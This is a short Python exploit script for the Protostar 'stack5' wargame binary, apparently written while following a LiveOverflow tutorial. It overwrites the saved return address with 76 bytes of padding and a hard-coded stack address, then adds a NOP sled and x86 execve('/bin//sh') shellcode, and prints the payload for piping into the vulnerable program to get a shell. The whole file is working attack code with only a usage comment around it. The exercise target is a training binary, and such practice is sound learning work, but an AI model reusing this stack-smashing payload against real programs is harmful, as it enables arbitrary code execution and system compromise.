#!/usr/bin/python
# http://liveoverflow.com/binary_hacking/protostar/stack5.html
# Usage: (python stack5.py;cat) | /opt/protostar/bin/stack5
import struct
 
def m32(dir):
    return struct.pack("I",dir)
 
padding="A"*76
ret=m32(0xbffff780)
nops="\x90"*20
shellcode = ""
shellcode += "\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80"
 
print (padding+ret+nops+shellcode)
